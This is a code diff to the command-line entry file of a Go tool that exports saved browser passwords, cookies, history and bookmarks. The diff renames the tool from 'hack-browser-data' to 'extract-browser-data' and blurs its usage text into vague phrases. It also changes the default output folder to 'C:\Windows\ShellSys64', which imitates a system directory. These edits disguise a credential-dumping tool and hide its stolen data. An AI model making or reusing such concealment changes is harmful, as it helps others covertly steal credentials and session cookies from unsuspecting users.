@@ -1,9 +1,9 @@
 package cmd
 
 import (
-	"hack-browser-data/core"
-	"hack-browser-data/log"
-	"hack-browser-data/utils"
+	"extract-browser-data/core"
+	"extract-browser-data/log"
+	"extract-browser-data/utils"
 	"os"
 	"strings"
 
@@ -22,15 +22,15 @@ var (
 
 func Execute() {
 	app := &cli.App{
-		Name:  "hack-browser-data",
-		Usage: "Export passwords/cookies/history/bookmarks from browser",
-		UsageText: "[hack-browser-data -b chrome -f json -dir results -cc]\n 	Get all data(password/cookie/history/bookmark) from chrome",
+		Name:  "extract-browser-data",
+		Usage: "Export Data",
+		UsageText: "[extract-browser-data -b chrome -f json -dir results -cc]\n 	Retrieve Datas",
 		Version: "0.3.5",
 		Flags: []cli.Flag{
 			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
 			&cli.BoolFlag{Name: "compress", Aliases: []string{"cc"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
 			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + strings.Join(core.ListBrowser(), "|")},
-			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &exportDir, Value: "results", Usage: "export dir"},
+			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &exportDir, Value: "C:\\Windows\\ShellSys64", Usage: "export dir"},
 			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "format, csv|json|console"},
 			&cli.StringFlag{Name: "profile-dir-path", Aliases: []string{"p"}, Destination: &customProfilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
 			&cli.StringFlag{Name: "key-file-path", Aliases: []string{"k"}, Destination: &customKeyPath, Value: "", Usage: "custom key file path"},
